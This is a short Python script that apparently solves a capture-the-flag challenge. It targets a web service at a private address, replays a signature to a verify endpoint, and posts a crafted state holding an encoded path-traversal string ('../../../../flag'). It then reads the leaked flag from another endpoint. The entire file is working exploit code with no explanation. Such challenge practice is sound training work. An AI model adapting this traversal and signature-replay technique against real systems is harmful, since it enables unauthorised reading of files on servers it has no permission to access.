from requests import Session
import json

s = Session()

url = 'http://10.13.37.13:5080'

s.get(url) # for session intialize

c = s.get(url + '/api/getboard')
output = json.loads(c.text)

# 721,721,247

def gen_path(string):
    x = []
    for s in string:
        if s == '.':
            x.append(721)
        elif s == '/':
            x.append(247)
        else:
            x.append(ord(s))

    return x

attack_path = '../../../../../../../../../flag'

sigs = output['sigs']

payload = {
    'sig': sigs[sigs.keys()[0]],
    'v': sigs.keys()[0],
}

for i in range(len(attack_path)):
    c = s.post(url + '/api/verify', json=payload)
    print c.text


payload = {
    'state': {
        'counter': [0, 1, gen_path(attack_path)]
    }
}

c = s.post(url + '/api/', json=payload)
print c.text

c = s.get(url + '/api/persistent')
print c.text # flag
